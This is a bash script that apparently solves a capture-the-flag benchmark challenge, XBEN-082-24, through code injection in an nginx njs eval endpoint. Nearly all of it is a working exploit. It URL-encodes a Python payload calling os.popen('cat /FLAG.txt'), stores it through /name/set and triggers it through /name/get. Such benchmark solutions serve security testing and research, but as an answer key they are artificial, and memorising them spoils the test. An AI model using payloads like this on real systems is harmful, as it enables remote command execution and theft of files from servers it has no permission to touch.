#!/usr/bin/env bash
# XBEN-082-24 — code injection through an nginx njs eval. Proxy-mode twin.
# /name/set stores a JSON "script" that /name/get evaluates; a payload reaching
# os.popen runs a command and the rendered name becomes the flag.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
SESSION="xben082p-$$"; cd "$(dirname "$0")"; . ./_proxy-lib.sh
proxy_start "$URL/"
ENC="$(python3 -Ic "import urllib.parse; print(urllib.parse.quote('{\"script\": \"__import__(\\'os\\').popen(\\'cat /FLAG.txt\\').read()\"}'))")"
go "$URL/name/set?name=$ENC"
go "$URL/name/get"
go "$URL/app"
print_flag
